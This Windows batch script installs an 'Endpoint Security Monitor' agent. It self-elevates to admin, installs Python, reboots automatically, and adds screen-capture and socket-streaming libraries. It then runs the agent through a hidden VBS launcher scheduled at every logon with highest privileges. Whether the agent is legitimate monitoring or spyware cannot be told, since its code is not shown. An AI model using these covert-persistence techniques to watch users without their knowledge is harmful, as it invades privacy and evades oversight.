@echo off
:: ============================================================
::  Endpoint Security Monitor - Silent Auto Installer
::  Just Run as Admin - everything installs automatically
::  Auto-resumes after reboot if Python needed restart
:: ============================================================

:: Auto-elevate to admin if not already
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

title Installing Endpoint Security Monitor...

set INSTALL_DIR=C:\EndpointMonitor
set LOG=%INSTALL_DIR%\install.log
set RESUME_FLAG=%INSTALL_DIR%\.resume_install

if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
echo [%date% %time%] Installation started >> "%LOG%"

echo.
echo ============================================================
echo   Installing Endpoint Security Monitor...
echo   Please wait, this is fully automatic.
echo ============================================================
echo.

:: ============================================================
::   Step 1: Copy files FIRST (does not need Python)
:: ============================================================
echo [1/5] Copying files...
for %%f in (agent.py config.json activity_monitor.py stream_client.py access_control.py advanced_protection.py check_setup.py self_protection.py remote_access_remover.py intruder_tracker.py) do (
    if exist "%~dp0%%f" copy /Y "%~dp0%%f" "%INSTALL_DIR%\%%f" >nul 2>&1
)

:: Also copy this installer so it can re-run from INSTALL_DIR after reboot
copy /Y "%~f0" "%INSTALL_DIR%\install_windows.bat" >nul 2>&1

echo [%date% %time%] Files copied >> "%LOG%"

:: ============================================================
::   Step 2: Install Python if missing
:: ============================================================
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo [2/5] Installing Python...

    winget --version >nul 2>&1
    if %errorlevel% equ 0 (
        echo       Using winget...
        winget install Python.Python.3.12 --accept-package-agreements --accept-source-agreements --silent >nul 2>&1
    ) else (
        echo       Downloading Python...
        powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.12.8/python-3.12.8-amd64.exe' -OutFile '%TEMP%\python_setup.exe' -UseBasicParsing" >nul 2>&1
        if exist "%TEMP%\python_setup.exe" (
            echo       Installing Python silently...
            "%TEMP%\python_setup.exe" /quiet InstallAllUsers=1 PrependPath=1 Include_pip=1
            del "%TEMP%\python_setup.exe" >nul 2>&1
        )
    )

    :: Update PATH for current session
    set "PATH=%PATH%;C:\Program Files\Python312;C:\Program Files\Python312\Scripts"
    set "PATH=%PATH%;C:\Program Files\Python313;C:\Program Files\Python313\Scripts"
    set "PATH=%PATH%;%LOCALAPPDATA%\Programs\Python\Python312;%LOCALAPPDATA%\Programs\Python\Python312\Scripts"
    set "PATH=%PATH%;%LOCALAPPDATA%\Programs\Python\Python313;%LOCALAPPDATA%\Programs\Python\Python313\Scripts"
    timeout /t 5 /nobreak >nul

    python --version >nul 2>&1
    if %errorlevel% neq 0 (
        echo [2/5] Python installed - scheduling auto-resume after reboot...
        echo [%date% %time%] Python needs restart, scheduling auto-resume >> "%LOG%"

        :: Create resume flag so installer knows to continue
        echo RESUME > "%RESUME_FLAG%"

        :: Schedule this installer to run automatically after reboot (RunOnce)
        reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v "EndpointMonitorSetup" /t REG_SZ /d "\"%INSTALL_DIR%\install_windows.bat\"" /f >nul 2>&1

        echo.
        echo ============================================================
        echo   Python installed. Restarting computer in 15 seconds...
        echo   Installation will finish automatically after restart.
        echo ============================================================
        echo.

        :: Auto-restart the computer
        shutdown /r /t 15 /c "Endpoint Monitor: Restarting to complete installation..."
        echo [%date% %time%] Scheduled reboot >> "%LOG%"
        timeout /t 16 /nobreak >nul
        exit /b 0
    )
)
echo [2/5] Python OK
echo [%date% %time%] Python OK >> "%LOG%"

:: Clean up resume flag if it exists
if exist "%RESUME_FLAG%" (
    del "%RESUME_FLAG%" >nul 2>&1
    echo [%date% %time%] Resumed after reboot >> "%LOG%"
)

:: ============================================================
::   Step 3: Install Python packages
:: ============================================================
echo [3/5] Installing packages...
python -m pip install --upgrade pip --quiet >nul 2>&1
python -m pip install Pillow mss "python-socketio[client]" websocket-client --quiet >nul 2>&1
echo [%date% %time%] Packages installed >> "%LOG%"

:: ============================================================
::   Step 4: Create auto-start scheduled task (HIDDEN - no window)
:: ============================================================
echo [4/5] Setting up auto-start...

:: Create VBS launcher that runs Python completely hidden (no CMD window)
(
    echo Set WshShell = CreateObject^("WScript.Shell"^)
    echo WshShell.CurrentDirectory = "%INSTALL_DIR%"
    echo WshShell.Run "python agent.py", 0, False
) > "%INSTALL_DIR%\run_hidden.vbs"

schtasks /delete /tn "EndpointSecurityMonitor" /f >nul 2>&1
schtasks /create /tn "EndpointSecurityMonitor" /tr "wscript.exe \"%INSTALL_DIR%\run_hidden.vbs\"" /sc onlogon /rl highest /f >nul 2>&1
echo [%date% %time%] Scheduled task created >> "%LOG%"

:: ============================================================
::   Step 5: Start monitor now (HIDDEN - no window)
:: ============================================================
echo [5/5] Starting monitor...
wscript.exe "%INSTALL_DIR%\run_hidden.vbs"
echo [%date% %time%] Monitor started >> "%LOG%"

:: Clean up RunOnce entry if still there
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v "EndpointMonitorSetup" /f >nul 2>&1

echo.
echo ============================================================
echo   DONE! Monitor is running.
echo   Files: %INSTALL_DIR%
echo   Auto-starts on every login.
echo ============================================================
echo.
echo [%date% %time%] Installation complete >> "%LOG%"
timeout /t 5
